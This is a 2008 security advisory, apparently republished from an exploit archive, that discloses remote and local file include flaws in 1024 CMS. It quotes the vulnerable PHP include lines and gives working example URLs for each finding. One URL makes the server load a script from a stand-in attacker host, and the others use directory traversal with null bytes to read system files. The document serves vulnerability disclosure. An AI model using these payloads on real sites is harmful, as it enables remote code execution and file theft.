@@ -1,0 +1,336 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-027
+
+
+Application:                    1024 CMS
+Versions Affected:              1.4.3, 1.4.4 RFC
+Vendor URL:                     http://www.1024cms.com/
+Bug:                            Multiple Remote/Local File Include
+Exploits:                       YES
+Reported:                       18.06.2008
+Second report:                  27.06.2008
+Vendor Response:                NONE
+Solution:                       NONE
+Date of Public Advisory:        04.07.2008
+Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+
+1024 CMS has Remote File Include vulnerability  and multiple Local File Include vulnerabilities. 
+
+
+1. Remote/Local File Include vulnerabilities found in scripts: 
+
+themes/blog/layouts/standard.php
+themes/default/layouts/standard.php
+themes/portfolio/layouts/standard.php
+themes/snazzy/layouts/standard.php
+
+Code
+****
+#################################################
+
+<?php include("./themes/".$theme_dir."/layouts/basic_header.php"); ?>
+<div class="centerbigtable">
+        <?php
+        if(!isset($page_include)) {
+                if($page_ck['custom'] == '0') include("./pages/".$page."/default/content.php");
+                else include("./pages/custom/".$page."/default/content.php");
+        } else include($page_include);
+        ?>
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/themes/blog/layouts/standard.php?page_include=http://evil.ru/evil.php
+http://[server]/[installdir]/themes/default/layouts/standard.php?theme_dir=../../../../../../../../../../../../../boot.ini%00
+http://[server]/[installdir]/themes/snazzy/layouts/standard.php?page=../../../../../../../../../../../../../boot.ini%00
+
+
+
+
+
+Multiple Local File Include vulnerabilities:
+
+
+
+
+2. Local File Include vulnerability found in script admin/lang/fr/reports/default.php
+
+Code
+****
+#################################################
+
+if(isset($_GET['t'])) {
+        switch($_GET['t']) {
+                case "forum":
+                include("../admin/lang/".$lang."/reports/ops/forum.php");
+                break;
+                
+                case "download":
+                include("../admin/lang/".$lang."/reports/ops/download.php");
+                break;
+
+                case "news":
+                include("../admin/lang/".$lang."/reports/ops/news.php");
+                break;
+        }
+} else die("You cannot access this page directly");
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/admin/lang/fr/reports/default.php?t=news&lang=../../../../../../../../../../../../../boot.ini%00
+
+
+3. Local File Include vulnerabilities found in scripts:
+
+admin/ops/admins/default.php
+admin/ops/reports/ops/download.php
+admin/ops/reports/ops/forum.php
+admin/ops/reports/ops/news.php
+
+Code
+****
+#################################################
+
+<?php
+include("./themes/".$admin_theme_dir."/templates/default_header.tpl");
+...
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/admin/ops/admins/default.php?admin_theme_dir=../../../../../../../../../../../../../boot.ini%00
+http://[server]/[installdir]/admin/ops/reports/ops/news.php?admin_theme_dir=../../../../../../../../../../../../../boot.ini%00
+
+
+4. Local File Include vulnerabilities found in scripts:
+
+lang/en/moderator/default.php
+lang/fr/moderator/default.php
+
+Code
+****
+#################################################
+
+if(isset($_GET['t'])) {
+        switch($_GET['t']) {
+                case "forum":
+                include("./lang/".$lang."/moderator/ops/forum.php");
+                break;
+                
+                case "download":
+                include("./lang/".$lang."/moderator/ops/download.php");
+                break;
+
+                case "gallery":
+                include("./lang/".$lang."/moderator/ops/gallery.php");
+                break;
+
+                case "news":
+                include("./lang/".$lang."/moderator/ops/news.php");
+                break;
+        }
+}
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/lang/en/moderator/default.php?t=news&lang=../../../../../../../../../../../../../boot.ini%00
+http://[server]/[installdir]/lang/fr/moderator/default.php?t=download&lang=../../../../../../../../../../../../../boot.ini%00
+
+
+5. Local File Include vulnerability found in script lang/de/moderator/default.php
+
+Code
+****
+#################################################
+
+if(isset($_GET['t'])) {
+        switch($_GET['t']) {
+                case "forum":
+                include("./lang/".$lang."/moderator/ops/forum.php");
+                break;
+                
+                case "download":
+                include("./lang/".$lang."/moderator/ops/download.php");
+                break;
+
+                case "news":
+                include("./lang/".$lang."/moderator/ops/news.php");
+                break;
+        }
+}
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/lang/de/moderator/default.php?t=forum&lang=../../../../../../../../../../../../../boot.ini%00
+
+
+6. Local File Include vulnerabilities found in scripts:
+
+pages/download/default/ops/add.php
+pages/download/default/ops/edit.php
+
+Code
+****
+#################################################
+
+if(isset($_SESSION['type']) && ($_SESSION['type'] == '1' || ($_SESSION['type'] == '2' && trim($canpostdown) == "true") || $_SESSION['type'] == '4')) {
+...
+} else {
+        if($canpostdown !== 'true') define("_CONTENT_", _POST_DISABLED_);
+        else define("_CONTENT_", _POST_LOGIN_);
+        include("./themes/".$theme_dir."/templates/no_content.tpl");
+}
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/pages/download/default/ops/add.php?theme_dir=../../../../../../../../../../../../../boot.ini%00
+
+
+7. Local File Include vulnerabilities found in scripts:
+
+pages/download/default/ops/newest.php
+pages/download/default/ops/search.php
+pages/download/default/ops/top.php
+pages/forum/default/content.php
+
+Code
+****
+#################################################
+
+<?php
+include("./themes/".$theme_dir."/templates/default_header.tpl");
+...
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/pages/download/default/ops/newest.php?theme_dir=../../../../../../../../../../../../../boot.ini%00
+http://[server]/[installdir]/pages/forum/default/content.php?theme_dir=../../../../../../../../../../../../../boot.ini%00
+
+
+8. Local File Include vulnerabilities found in scripts:
+
+themes/blog/layouts/basic_footer.php
+themes/default/layouts/basic_footer.php
+themes/portfolio/layouts/basic_footer.php
+themes/snazzy/layouts/basic_footer.php
+
+Code
+****
+#################################################
+
+...
+<?php include("./themes/".$theme_dir."/templates/footer.tpl"); ?>
+...
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/themes/blog/layouts/basic_footer.php?theme_dir=../../../../../../../../../../../../../boot.ini%00
+
+
+9. Local File Include vulnerabilities found in scripts:
+
+themes/blog/layouts/basic_header.php
+themes/default/layouts/basic_header.php
+themes/portfolio/layouts/basic_header.php
+themes/snazzy/layouts/basic_header.php
+
+Code
+****
+#################################################
+
+...
+<?php include("./themes/".$theme_dir."/templates/header.tpl"); ?></td>
+...
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/themes/default/layouts/basic_header.php?theme_dir=../../../../../../../../../../../../../boot.ini%00
+
+
+10. Local File Include vulnerabilities found in scripts:
+
+themes/blog/layouts/print.php 
+themes/default/layouts/print.php
+themes/portfolio/layouts/print.php
+themes/snazzy/layouts/print.php
+
+Code
+****
+#################################################
+
+if(!isset($page_include)) {
+        if($page_ck['custom'] == '0') include("./pages/".$page."/default/content.php");
+        else include("./pages/custom/".$page."/default/content.php");
+} else include("./themes/".$theme_dir."/templates/".$page_include);
+include("./themes/".$theme_dir."/templates/footer.tpl");
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/themes/blog/layouts/print.php?page=../../../../../../../../../../../../../boot.ini%00
+http://[server]/[installdir]/themes/default/layouts/print.php?page_include=../../../../../../../../../../../../../boot.ini%00
+http://[server]/[installdir]/themes/portfolio/layouts/print.php?theme_dir=../../../../../../../../../../../../../boot.ini%00
+
+
+
+11. Local File Include vulnerabilities found in scripts: 
+
+themes/blog/layouts/total.php
+themes/default/layouts/total.php
+themes/portfolio/layouts/total.php
+themes/snazzy/layouts/total.php
+
+Code
+****
+#################################################
+
+    <td><?php include("./themes/".$theme_dir."/templates/header.tpl"); ?></td>
+  </tr>
+  <tr>
+    <td>
+        <?php
+        if($page_ck['custom'] == '0') include("./pages/".$page."/default/content.php");
+        else include("./pages/custom/".$page."/default/content.php");
+        ?>
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/themes/default/layouts/total.php?theme_dir=../../../../../../../../../../../../../boot.ini%00
+http://[server]/[installdir]/themes/snazzy/layouts/total.php?page=../../../../../../../../../../../../../boot.ini%00
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsec [dot] ru
+            http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-07-04]
